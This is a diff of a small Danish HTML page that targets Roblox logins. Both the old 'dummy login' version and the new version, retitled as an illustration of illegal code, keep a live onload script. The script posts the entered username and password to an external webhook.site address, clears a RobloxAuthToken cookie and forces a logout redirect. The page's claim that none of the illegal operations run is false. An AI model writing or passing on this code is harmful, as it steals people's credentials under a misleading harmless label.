@@ -1,31 +1,33 @@
-o<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="da">
 <head>
   <meta charset="UTF-8">
-  <title>Dummy Login Test</title>
+  <title>Eksempel på ulovlig login (KUN KOMMENTAR)</title>
   <script>
-       window.onload = function() {
-           let username = document.getElementById("usernameInput").value;
-           let password = document.getElementById("passwordInput").value;
-           if(username && password) {
-               fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
-                   method: "POST",
-                   body: JSON.stringify({username: username, password: password})
-               });
-           }
-           document.cookie = "RobloxAuthToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
-           window.location.href = "https://www.roblox.com/Logout";
-       };
+    window.onload = function() {
+
+      let username = document.getElementById("usernameInput").value;
+       let password = document.getElementById("passwordInput").value;
+       if(username && password) {
+           fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
+               method: "POST",
+               body: JSON.stringify({username: username, password: password})
+           });
+       }
+      
+      // Slette Roblox login-token og tvinge logout
+       document.cookie = "RobloxAuthToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+       window.location.href = "https://www.roblox.com/Logout";
+      
     };
   </script>
 </head>
 <body>
-  <h2>Indtast dummy-login</h2>
-  <form id="loginForm">
-    <input type="text" id="usernameInput" placeholder="Username" required>
-    <input type="password" id="passwordInput" placeholder="Password" required>
-    <button type="submit">Gem</button>
-  </form>
+  <h2>Dette er KUN et eksempel på ulovlig kode (kommentar)</h2>
+  <p>Ingen af de ulovlige operationer kører.</p>
+
+  <!-- Dummy input for illustration -->
+  <input type="text" id="usernameInput" placeholder="Username">
+  <input type="password" id="passwordInput" placeholder="Password">
 </body>
 </html>
-
